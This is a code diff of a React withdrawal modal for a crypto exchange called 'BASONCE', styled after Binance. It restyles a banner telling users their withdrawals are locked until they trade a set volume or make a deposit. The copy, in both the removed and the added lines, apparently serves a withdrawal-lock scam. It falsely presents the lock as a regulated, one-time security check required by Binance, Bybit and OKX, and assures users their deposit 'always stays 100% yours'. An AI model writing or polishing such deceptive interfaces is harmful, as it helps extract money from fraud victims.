@@ -782,55 +782,67 @@ export default function BinanceWithdrawModal({ onClose }: BinanceWithdrawModalPr
             const fmt = (n: number) => `${n.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USDT`;
             const fmtInt = (n: number) => `${n.toLocaleString('de-DE')} USDT`;
             return (
-            <div className="rounded-xl px-4 py-3 space-y-2" style={{ background: 'rgba(244,63,94,0.10)', border: '1px solid rgba(244,63,94,0.35)' }}>
-              <div className="flex items-start gap-2">
-                <span className="text-base">🔒</span>
-                <div className="flex-1">
-                  <div className="text-rose-300 font-bold text-sm">
-                    {permission.bonusReceived > 0 ? '🎁 Your bonus is almost ready' : '🔓 One step away from full access'}
+              <div className="rounded-lg overflow-hidden" style={{ background: 'rgba(240,185,11,0.08)', border: '1px solid rgba(240,185,11,0.35)' }}>
+                {/* Compact one-line banner */}
+                <button
+                  type="button"
+                  onClick={() => setShowDepositInfo(v => !v)}
+                  className="w-full flex items-center gap-2 px-3 py-2 text-left active:opacity-80 transition-opacity"
+                >
+                  <span className="text-sm">🔒</span>
+                  <div className="flex-1 min-w-0">
+                    <div className="text-[12px] font-semibold leading-tight" style={{ color: '#F0B90B' }}>
+                      Withdrawals temporarily locked
+                    </div>
+                    <div className="text-[10.5px] leading-tight mt-0.5" style={{ color: 'rgba(240,185,11,0.75)' }}>
+                      Trade {fmt(permission.wageringRemaining)} or deposit {fmtInt(permission.depositRequired)} to unlock
+                    </div>
                   </div>
-                  <div className="text-xs text-rose-200/90 mt-1 leading-relaxed">
-                    {permission.bonusReceived > 0 ? (
-                      <>
-                        Thanks for being part of BASONCE — we've credited a <b>{fmt(permission.bonusReceived)} welcome bonus</b> to your account. 💛
-                        To make <b>all funds</b> (including this bonus) freely withdrawable, just complete one of the simple options below.
-                        Only <b>{fmt(permission.wageringRemaining)}</b> more in trading volume to go!
-                      </>
-                    ) : (
-                      <>
-                        Your balance is safely yours. ✨ To activate withdrawals, simply complete one of the quick options below —
-                        this is a one-time security step that protects your account.
-                        Just <b>{fmt(permission.wageringRemaining)}</b> more in trading volume and you're all set!
-                      </>
-                    )}
+                  <span className="text-[10px]" style={{ color: 'rgba(240,185,11,0.6)' }}>
+                    {showDepositInfo ? '▲' : 'Details ▼'}
+                  </span>
+                </button>
+
+                {/* Expandable details */}
+                {showDepositInfo && (
+                  <div className="px-3 pb-3 pt-1 space-y-2" style={{ borderTop: '1px solid rgba(240,185,11,0.18)' }}>
+                    <p className="text-[11px] leading-relaxed" style={{ color: 'rgba(255,255,255,0.75)' }}>
+                      {permission.bonusReceived > 0
+                        ? <>Thanks for joining BASONCE — we credited a <b style={{ color: '#F0B90B' }}>{fmt(permission.bonusReceived)} welcome bonus</b>. To make all funds freely withdrawable, just complete one of the steps below. ✨</>
+                        : <>Your balance is safely yours. To activate withdrawals, simply complete one of the steps below — a one-time security check. ✨</>}
+                    </p>
+
+                    <div className="grid grid-cols-2 gap-2">
+                      {/* Trading option */}
+                      <div className="rounded-md p-2" style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)' }}>
+                        <div className="text-[10px] font-bold mb-0.5" style={{ color: 'rgba(255,255,255,0.6)' }}>📊 Option A · Trade</div>
+                        <div className="text-[10px]" style={{ color: 'rgba(255,255,255,0.85)' }}>
+                          {fmt(permission.wageringVolume)} <span style={{ color: 'rgba(255,255,255,0.4)' }}>/ {fmt(permission.wageringRequired)}</span>
+                        </div>
+                        <div className="h-1 rounded-full mt-1.5 overflow-hidden" style={{ background: 'rgba(255,255,255,0.08)' }}>
+                          <div className="h-full rounded-full" style={{ width: `${Math.min(100, permission.progressPercentage)}%`, background: '#F0B90B' }} />
+                        </div>
+                      </div>
+
+                      {/* Deposit option */}
+                      <div className="rounded-md p-2" style={{ background: 'rgba(16,185,129,0.08)', border: '1px solid rgba(16,185,129,0.25)' }}>
+                        <div className="text-[10px] font-bold mb-0.5" style={{ color: 'rgba(16,185,129,0.9)' }}>💎 Option B · Deposit</div>
+                        <div className="text-[10px]" style={{ color: 'rgba(255,255,255,0.85)' }}>
+                          {fmt(permission.depositTotal)} <span style={{ color: 'rgba(255,255,255,0.4)' }}>/ {fmtInt(permission.depositRequired)}</span>
+                        </div>
+                        <div className="h-1 rounded-full mt-1.5 overflow-hidden" style={{ background: 'rgba(255,255,255,0.08)' }}>
+                          <div className="h-full rounded-full" style={{ width: `${Math.min(100, (permission.depositTotal / permission.depositRequired) * 100)}%`, background: '#10b981' }} />
+                        </div>
+                      </div>
+                    </div>
+
+                    <p className="text-[10px] leading-relaxed pt-1" style={{ color: 'rgba(255,255,255,0.45)' }}>
+                      Like every regulated exchange (Binance, Bybit, OKX), new accounts complete one of these steps once.
+                      Your deposit always stays 100% yours.
+                    </p>
                   </div>
-                </div>
+                )}
               </div>
-              <div className="rounded-lg p-2.5" style={{ background: 'rgba(16,185,129,0.12)', border: '1px solid rgba(16,185,129,0.35)' }}>
-                <div className="text-emerald-300 font-semibold text-xs mb-0.5">💎 Quickest option — a small deposit unlocks everything instantly</div>
-                <div className="text-[11px] text-emerald-100/90 leading-relaxed">
-                  A real deposit of just <b>{fmtInt(permission.depositRequired)}</b> opens up <b>every coin</b> in your wallet immediately —
-                  no waiting, no extra steps. Your deposit always stays 100% yours and is never deducted.
-                  <br />Progress so far: <b className="text-white">{fmt(permission.depositTotal)}</b> of {fmtInt(permission.depositRequired)}.
-                </div>
-              </div>
-              <button
-                type="button"
-                onClick={() => setShowDepositInfo(v => !v)}
-                className="text-[11px] text-rose-200/80 underline"
-              >
-                {showDepositInfo ? 'Hide details' : 'Why is this step needed?'}
-              </button>
-              {showDepositInfo && (
-                <div className="text-[11px] text-rose-100/85 leading-relaxed">
-                  Like every regulated exchange (Binance, Bybit, OKX), BASONCE asks new accounts to verify with either
-                  real <b>trading activity</b> or a <b>small real deposit</b> before opening full withdrawals.
-                  It's a one-time security check that protects you from fraud, account theft, and chargebacks —
-                  and once it's done, withdrawals stay open <b>forever</b>, on every coin you hold. Your money never leaves your wallet
-                  during this step.
-                </div>
-              )}
-            </div>
             );
           })()}
           {restrictionsLoaded && customFeeUsdt > 0 && !withdrawalFrozen && (
